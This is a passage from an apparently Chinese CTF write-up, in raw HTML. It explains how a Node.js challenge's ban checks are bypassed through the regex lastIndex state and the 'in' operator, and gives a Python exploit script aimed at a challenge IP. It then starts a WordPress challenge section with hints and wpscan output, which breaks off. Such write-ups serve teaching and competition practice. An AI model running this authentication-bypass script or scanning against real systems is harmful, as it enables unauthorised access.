class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;<br>        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span><br>    &#125;<br>    regex_string = regex_string.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, regex_string.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>)<span class="hljs-comment">//è¿™é‡Œæ˜¯å»æ‰æœ€åä¸€ä¸ª|</span><br>    banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)<span class="hljs-comment">//å°†regex_stringè½¬æ¢ä¸ºæ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡</span><br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹äº†ä¸‹å…¨å±€æ ‡å¿—<code>g</code>ï¼š</p><p><img src="/img/nctfwaiatwhat2.png" alt="nctfwaiatwhat2"></p><p>æ¥ä¸‹æ¥æ˜¯ä¸¤ä¸ª<code>waf</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// åŸºäºæ­£åˆ™æŠ€æœ¯çš„å°ç¦ç”¨æˆ·åŒ¹é…ç³»ç»Ÿçš„è®¾è®¡ä¸å®ç°</span><br>    <span class="hljs-keyword">let</span> test1 = banned_users_regex.<span class="hljs-title function_">test</span>(username)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½¿ç”¨æ­£åˆ™<span class="hljs-subst">$&#123;banned_users_regex&#125;</span>åŒ¹é…<span class="hljs-subst">$&#123;username&#125;</span>çš„ç»“æœä¸ºï¼š<span class="hljs-subst">$&#123;test1&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test1) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ç¬¬ä¸€ä¸ªåˆ¤æ–­åŒ¹é…åˆ°å°ç¦ç”¨æˆ·ï¼š&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;è¢«å°ç¦ï¼Œæ— æ³•é‰´æƒï¼&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-comment">// åŸºäºinå…³é”®å­—çš„å°ç¦ç”¨æˆ·åŒ¹é…ç³»ç»Ÿçš„è®¾è®¡ä¸å®ç°</span><br>    <span class="hljs-keyword">let</span> test2 = (username <span class="hljs-keyword">in</span> banned_users)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½¿ç”¨inå…³é”®å­—åŒ¹é…<span class="hljs-subst">$&#123;username&#125;</span>çš„ç»“æœä¸ºï¼š<span class="hljs-subst">$&#123;test2&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test2)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ç¬¬äºŒä¸ªåˆ¤æ–­åŒ¹é…åˆ°å°ç¦ç”¨æˆ·ï¼š&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;è¢«å°ç¦ï¼Œæ— æ³•é‰´æƒï¼&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆçœ‹ç¬¬äºŒä¸ª<code>waf</code>ï¼Œæ³¨æ„è¿™é‡Œï¼š<code>username in banned_users</code></p><blockquote><p>å¦‚æœæŒ‡å®šçš„å±æ€§åœ¨æŒ‡å®šçš„å¯¹è±¡æˆ–å…¶åŸå‹é“¾ä¸­ï¼Œåˆ™ <strong><code>in</code></strong> <strong>è¿ç®—ç¬¦</strong>è¿”å› <code>true</code></p></blockquote><p>è¿™ä¸œè¥¿å¯¹äºæ•°ç»„å…¶å®æ£€æŸ¥çš„æ˜¯ä¸‹æ ‡ï¼Œçœ‹å‡ ä¸ªæ —å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> car = &#123; <span class="hljs-attr">make</span>: <span class="hljs-string">&#x27;Honda&#x27;</span>, <span class="hljs-attr">model</span>: <span class="hljs-string">&#x27;Accord&#x27;</span>, <span class="hljs-attr">year</span>: <span class="hljs-number">1998</span> &#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;make&#x27;</span> <span class="hljs-keyword">in</span> car);<br><br><span class="hljs-comment">//true</span><br><span class="hljs-keyword">const</span> car = &#123; <span class="hljs-attr">make</span>: <span class="hljs-string">&#x27;Honda&#x27;</span>, <span class="hljs-attr">model</span>: <span class="hljs-string">&#x27;Accord&#x27;</span>, <span class="hljs-attr">year</span>: <span class="hljs-number">1998</span> &#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Honda&#x27;</span> <span class="hljs-keyword">in</span> car);<br><br><span class="hljs-comment">//false</span><br><br>&gt; <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;admin&#x27;</span>]<br><span class="hljs-literal">false</span><br><br>&gt; <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;admin&#x27;</span>]<br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><blockquote><p>ç”±äº banned_users ä¸º Array ç±»å‹ï¼Œä¸å­˜åœ¨ admin å±æ€§ï¼Œå› æ­¤ test2 å®é™…ä¸Šåˆ¤æ–­çš„æ˜¯banned_usersä¸­æ˜¯å¦å­˜åœ¨æ•°ç»„ç´¢å¼•ä¸ºusernameçš„å€¼ï¼ˆç”±äºå¯¹è±¡çš„å±æ€§åç§°ä¼šè¢«éšå¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œâ€0â€å’Œ0éƒ½å¯ä»¥ä½œä¸ºæ•°ç»„ç´¢å¼•)</p></blockquote><p>æ‰€ä»¥ç¬¬äºŒä¸ª<code>waf</code>æ²¡å•¥ç”¨ï¼Œå†çœ‹ç¬¬ä¸€ä¸ªï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// åŸºäºæ­£åˆ™æŠ€æœ¯çš„å°ç¦ç”¨æˆ·åŒ¹é…ç³»ç»Ÿçš„è®¾è®¡ä¸å®ç°</span><br>    <span class="hljs-keyword">let</span> test1 = banned_users_regex.<span class="hljs-title function_">test</span>(username)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä½¿ç”¨æ­£åˆ™<span class="hljs-subst">$&#123;banned_users_regex&#125;</span>åŒ¹é…<span class="hljs-subst">$&#123;username&#125;</span>çš„ç»“æœä¸ºï¼š<span class="hljs-subst">$&#123;test1&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test1) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ç¬¬ä¸€ä¸ªåˆ¤æ–­åŒ¹é…åˆ°å°ç¦ç”¨æˆ·ï¼š&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;è¢«å°ç¦ï¼Œæ— æ³•é‰´æƒï¼&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br><br>banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)<span class="hljs-comment">//å°†regex_stringè½¬æ¢ä¸ºæ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡</span><br></code></pre></td></tr></table></figure><p>æ­£åˆ™åˆ¤æ–­éƒ¨åˆ†ä½¿ç”¨äº†<code>banned_users_regex.test()</code>å‡½æ•°ï¼Œå¹¶ä¸”<code>new RegExp(regex_string, &quot;g&quot;)</code> å®šä¹‰äº† g çš„å…¨å±€æ ‡å¿—ï¼š</p><blockquote><p><strong><code>test()</code></strong> æ–¹æ³•æ‰§è¡Œä¸€ä¸ªæ£€ç´¢ï¼Œç”¨æ¥æŸ¥çœ‹æ­£åˆ™è¡¨è¾¾å¼ä¸æŒ‡å®šçš„å­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…ã€‚è¿”å› <code>true</code> æˆ– <code>false</code>ã€‚</p><p>å¦‚æœæ­£åˆ™è¡¨è¾¾å¼è®¾ç½®äº†å…¨å±€æ ‡å¿—ï¼Œ<code>test()</code> çš„æ‰§è¡Œä¼šæ”¹å˜æ­£åˆ™è¡¨è¾¾å¼ <code>lastIndex</code>å±æ€§ã€‚è¿ç»­çš„æ‰§è¡Œ<code>test()</code>æ–¹æ³•ï¼Œåç»­çš„æ‰§è¡Œå°†ä¼šä» lastIndex å¤„å¼€å§‹åŒ¹é…å­—ç¬¦ä¸²</p></blockquote><p>æ¯”å¦‚ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&gt; <span class="hljs-keyword">let</span> r = <span class="hljs-regexp">/^admin$/g</span><br><br>&gt; r.<span class="hljs-property">lastIndex</span><br><span class="hljs-number">0</span><br><br>&gt; r.<span class="hljs-title function_">test</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br><span class="hljs-literal">true</span><br><br>&gt; r.<span class="hljs-property">lastIndex</span><br><span class="hljs-number">5</span><br><br>&gt;r.<span class="hljs-title function_">test</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br><span class="hljs-literal">false</span><br><br>&gt; r.<span class="hljs-property">lastIndex</span><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§è®©æ­£åˆ™è¡¨è¾¾å¼åˆ¤æ–­ä¸¤æ¬¡<code>admin</code>å»ç»•è¿‡æ£€æµ‹ã€‚</p><p>ä½†æ³¨æ„è¿™é‡Œï¼Œæ¯æ¬¡è¯·æ±‚çš„æ—¶å€™éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„<code>banned_users_regex</code>æ¥æ›´æ–°å°ç¦ç”¨æˆ·çš„æ­£åˆ™ä¿¡æ¯ï¼Œæ¢å¤<code>lastIndex</code>çš„ä½ç½®ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// æ¯æ¬¡è¯·æ±‚å‰ï¼Œæ›´æ–°å°ç¦ç”¨æˆ·æ­£åˆ™ä¿¡æ¯</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-title function_">build_banned_users_regex</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;å°ç¦ç”¨æˆ·æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ»¡è¶³è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æˆ·åä¸ºè¢«å°ç¦ç”¨æˆ·åï¼‰ï¼š&quot;</span>,banned_users_regex)<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    &#125;<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br></code></pre></td></tr></table></figure><p>ä½†è¿™ä¸ª<code>try catch</code>å‘Šè¯‰æˆ‘ä»¬ï¼šå¦‚æœä¼ å…¥çš„æ•°æ®å¯¼è‡´æŠ¥é”™ï¼Œå°±å¯ä»¥è·³è¿‡æ­£åˆ™è¡¨è¾¾å¼çš„æ›´æ–°ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeRegExp</span>(<span class="hljs-params">string</span>) &#123;<br>    <span class="hljs-keyword">return</span> string.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);<br>&#125;<br><span class="hljs-comment">//è¿™å‡½æ•°çš„ä½œç”¨å°±æ˜¯å°†éœ€è¦è½¬ä¹‰çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæ–œæ +å…¶æœ¬èº«</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;<br>        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œ<code>replace</code>æ˜¯é’ˆå¯¹å­—ç¬¦ä¸²å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥<code>string</code>å‚æ•°ä¸ºéå­—ç¬¦ä¸²ç±»å‹æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œç»•è¿‡<code>regex</code>æ›´æ–°ã€‚</p><p><code>/ban_user</code>è¿™ä¸ªè·¯ç”±æ²¡å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä»»ä½•è¿‡æ»¤ã€è½¬ä¹‰ç­‰ã€‚ç†è®ºä¸Šæˆ‘ä»¬å¯ä»¥æ„é€ ä»»æ„è¾“å…¥ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> ban_username = req.<span class="hljs-property">body</span>.<span class="hljs-property">ban_username</span><br>    <span class="hljs-keyword">if</span>(!ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ban_usernameä¸èƒ½ä¸ºç©º&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(username === ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ä¸èƒ½å°ç¦è‡ªå·±&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">of</span> banned_users)&#123;<br>        <span class="hljs-keyword">if</span> (name === ban_username) &#123;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·å·²ç»è¢«å°ç¦&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>    &#125;<br>    banned_users.<span class="hljs-title function_">push</span>(ban_username)<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;å°ç¦æˆåŠŸï¼&quot;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>ç°åœ¨è§£é¢˜æ€è·¯å°±æ¸…æ™°äº†ï¼š</p><ul><li>è®¿é—® &#x2F;api&#x2F;ban_user è·¯ç”±ï¼Œæ„é€ ä¼ å…¥å‚æ•° ban_username ä¸º å¯¹è±¡ã€æ•°ç»„ ç­‰å…¶ä»–æ•°æ®ç±»å‹ </li><li>è®¿é—® &#x2F;api&#x2F;flag ï¼Œæ­£åˆ™åŒ¹é…æˆåŠŸï¼Œä½¿å¾— regex çš„ lastIndex ç§»è‡³ â€œadminâ€.length ä»¥å </li><li>è®¿é—® &#x2F;api&#x2F;flagï¼Œæ­£åˆ™åŒ¹é…å¤±è´¥ï¼ŒæˆåŠŸç»•è¿‡æ­£åˆ™ wafï¼Œæ­£åˆ™ waf è¿”å› falseï¼Œè·å¾— flag</li></ul><p><code>exp</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>remote_addr=<span class="hljs-string">&quot;http://117.50.175.234:9001&quot;</span><br><br>rs = requests.Session()<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/register&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/ban_user&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;ban_username&quot;</span>:&#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br></code></pre></td></tr></table></figure><h3 id="ez-wordpress-æœªåšå®Œ"><a href="#ez-wordpress-æœªåšå®Œ" class="headerlink" title="ez_wordpress[æœªåšå®Œ]"></a>ez_wordpress[æœªåšå®Œ]</h3><blockquote><p>Hint 1: å¯ä»¥æ€è€ƒä¸‹å¦‚ä½•å¯¹ WordPress è¿›è¡Œä¿¡æ¯æ”¶é›† </p><p> Hint 2: æ³¨æ„ç‰ˆæœ¬ (6.4.1) æ³¨æ„ä¸€äº›ç¬¬ä¸‰æ–¹çš„ä¸œè¥¿ </p><p> Hint 3:  ç»“åˆä¿¡æ¯æ”¶é›†å’Œç½‘ä¸Šå·²æœ‰çš„ä¸œè¥¿å°±å¯ä»¥è‡ªå·±æœ¬åœ°æ­å»ºä¸€ä¸ªç±»ä¼¼çš„ç¯å¢ƒè¿›è¡Œæµ‹è¯• æ¶‰åŠçš„ä»£ç å®¡è®¡éƒ¨åˆ†å…¶å®å¾ˆå°‘ </p><p> Hint 4: <a href="https://wwnt.lanzout.com/iwUdK1ir03te">https://wwnt.lanzout.com/iwUdK1ir03te</a> </p><p> Hint 5: upload phar + file read (ssrf) &#x3D;&gt; rce </p><p> Hint 6: è¯·ä¸è¦ä½¿ç”¨ burp çš„ Paste from file åŠŸèƒ½ (å­˜åœ¨ bug)  å»ºè®®æ‰‹åŠ¨æ„é€  upload.html ç„¶åæµè§ˆå™¨é€‰æ‹©æ–‡ä»¶æŠ“å–ä¸Šä¼ åŒ…  æˆ–è€…å†™ python è„šæœ¬ä¸Šä¼   æˆ–è€…ä½¿ç”¨ yakit</p></blockquote><p><code>wpscan</code>ç›´æ¥æ‰«</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">viper3ã‰¿kali)-[~]<br>â””â”€$ wpscan --url http://124.71.184.68:8012/ --api-token xxxxxxxxxxxxx<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<span class="hljs-string"></span><br><span class="hljs-string">          \ \  /\  / /</span>|<span class="hljs-string"> </span>|<span class="hljs-string">__) </span>|<span class="hljs-string"> (___   ___  __ _ _ __ Â®</span><br><span class="hljs-string">           \ \/  \/ / </span>|<span class="hljs-string">  ___/ \___ \ / __</span>|<span class="hljs-string">/ _` </span>|<span class="hljs-string"> &#x27;_ \</span><br><span class="hljs-string">            \  /\  /  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">     ____) </span>|<span class="hljs-string"> (__</span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<br>             \/  \/   |<span class="hljs-string">_</span>|<span class="hljs-string">    </span>|<span class="hljs-string">_____/ \___</span>|<span class="hljs-string">\__,_</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.22<br>       Sponsored by Automattic - https://automattic.com/<br>       <span class="hljs-meta">@_WPScan_,</span> <span class="hljs-meta">@ethicalhack3r,</span> <span class="hljs-meta">@erwan_lr,</span> <span class="hljs-meta">@firefart</span><br>_______________________________________________________________<br><br>[+] URL: http://124.71.184.68:8012/ [124.71.184.68]<br>[+] Started: Sat Dec 30 17:37:30 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> |<span class="hljs-string"> Interesting Entries:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - Server: Apache/2.4.54 (Debian)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - X-Powered-By: PHP/7.4.33</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://124.71.184.68:8012/xmlrpc.php</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://124.71.184.68:8012/readme.html</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://124.71.184.68:8012/wp-cron.php</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> 